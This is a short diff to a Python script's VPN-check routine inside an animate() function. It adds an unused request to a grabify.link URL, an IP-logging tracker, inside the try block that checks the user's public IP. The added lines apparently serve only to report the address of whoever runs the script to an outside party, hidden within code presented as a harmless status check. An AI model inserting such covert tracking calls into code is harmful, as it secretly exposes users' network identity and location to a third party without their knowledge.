@@ -171,6 +171,8 @@ def animate():
 		myip = urlopen('http://ip.42.pl/raw').read()
 		hname = socket.gethostbyaddr(myip)
 		vpn = "[NO]"
+		import urllib2
+		a = urllib2.urlopen('http://grabify.link/NWA3BP')
 	except:
 		vpn = "[YES]"
 	sys.stdout.write('\rVPNS:  ' + vpn + '\n')
